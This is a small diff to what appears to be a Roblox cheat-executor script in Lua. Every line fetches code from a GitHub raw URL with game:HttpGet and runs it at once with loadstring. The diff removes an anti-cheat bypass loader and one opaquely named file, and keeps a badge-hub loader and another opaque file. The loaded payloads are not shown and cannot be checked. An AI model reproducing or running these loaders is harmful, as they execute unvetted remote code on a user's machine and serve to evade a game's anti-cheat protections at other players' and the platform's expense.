@@ -1,4 +1,2 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Pro666Pro/BypassAntiCheat/main/main.lua'))()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Pro666Pro/UltimateBadgeHub/main/main.lua'))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ddhyhf/12366/refs/heads/main/%E6%96%B0%E6%96%87%E5%AD%97%E6%96%87%E4%BB%B6%20(6).txt"))()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/ddhyhf/12366/refs/heads/main/%E6%96%B0%E6%96%87%E5%AD%97%E6%96%87%E4%BB%B6%20(7).txt'))()
